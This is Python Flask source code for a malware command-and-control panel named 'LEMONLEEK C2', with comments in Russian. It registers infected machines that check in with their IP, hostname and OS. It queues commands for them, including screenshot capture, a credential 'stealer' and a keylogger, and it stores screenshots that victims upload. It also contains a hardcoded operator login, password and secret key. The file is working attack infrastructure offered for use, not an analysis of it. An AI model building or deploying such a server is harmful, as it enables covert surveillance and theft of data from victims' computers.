import os
from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session
import datetime
import base64

app = Flask(__name__)
app.secret_key = 'lemonleek_secret_123'

# ТВОЙ ЛОГИН И ПАРОЛЬ
USER = "umer2016"
PASS = "lola281900"

clients = {}
commands = {}

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #1e1e1e; color: #00ff00; font-family: monospace; padding: 50px; }
        input { padding: 10px; margin: 5px; background: #333; color: #fff; border: 1px solid #00ff00; }
        button { padding: 10px 20px; background: #00ff00; color: black; border: none; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <h1>LEMONLEEK C2 - LOGIN</h1>
    <form method="POST">
        <input type="text" name="username" placeholder="Login" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Enter</button>
    </form>
</body>
</html>
"""

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>C2 Panel</title>
    <meta http-equiv="refresh" content="5">
    <style>
        body { background: #1e1e1e; color: #00ff00; font-family: monospace; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; }
        .btn { background: #00ff00; color: black; border: none; padding: 5px 10px; cursor: pointer; text-decoration: none; margin-right: 5px; font-weight: bold; }
        .logout { color: #ff0000; text-decoration: none; float: right; font-weight: bold; }
        img { max-width: 500px; border: 2px solid #00ff00; margin-top: 10px; }
    </style>
</head>
<body>
    <h1>LEMONLEEK C2 PANEL</h1>
    <a href="/logout" class="logout">LOGOUT</a>
    <h2>Active Clients: {{ count }}</h2>
    <table>
        <tr><th>ID</th><th>IP</th><th>PC Name</th><th>OS</th><th>Last Seen</th><th>Actions</th></tr>
        {% for id, info in clients.items() %}
        <tr>
            <td>{{ id }}</td>
            <td>{{ info.ip }}</td>
            <td>{{ info.pc }}</td>
            <td>{{ info.os }}</td>
            <td>{{ info.time }}</td>
            <td>
                <a href="/cmd/{{ id }}/screenshot" class="btn">Screenshot</a>
                <a href="/cmd/{{ id }}/stealer" class="btn">Stealer</a>
                <a href="/cmd/{{ id }}/keylogger" class="btn">Keylogger</a>
            </td>
        </tr>
        {% endfor %}
    </table>
    
    {% if screenshot %}
    <h2>Last Screenshot:</h2>
    <img src="data:image/png;base64,{{ screenshot }}" />
    {% endif %}
</body>
</html>
"""

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['username'] == USER and request.form['password'] == PASS:
            session['logged_in'] = True
            return redirect(url_for('index'))
        return "Wrong login or password"
    return LOGIN_HTML

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/')
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    # Берем последний скриншот, если есть
    last_screenshot = None
    if os.path.exists("last_screenshot.txt"):
        with open("last_screenshot.txt", "r") as f:
            last_screenshot = f.read()
            
    return render_template_string(HTML, clients=clients, count=len(clients), screenshot=last_screenshot)

@app.route('/api/checkin', methods=['POST'])
def checkin():
    data = request.json
    cid = data.get('id')
    clients[cid] = {
        'ip': request.remote_addr,
        'pc': data.get('pc', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'time': datetime.datetime.now().strftime("%H:%M:%S")
    }
    cmd = commands.pop(cid, None)
    return jsonify({"status": "ok", "command": cmd})

@app.route('/api/data', methods=['POST'])
def get_data():
    data = request.json
    if data.get('type') == 'screenshot':
        img_data = data.get('img')
        # Сохраняем скриншот в файл, чтобы потом отобразить
        with open("last_screenshot.txt", "w") as f:
            f.write(img_data)
    return jsonify({"status": "ok"})

@app.route('/cmd/<cid>/<action>')
def send_cmd(cid, action):
    if not session.get('logged_in'):
        return "Unauthorized", 401
    commands[cid] = action
    return redirect(url_for('index'))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
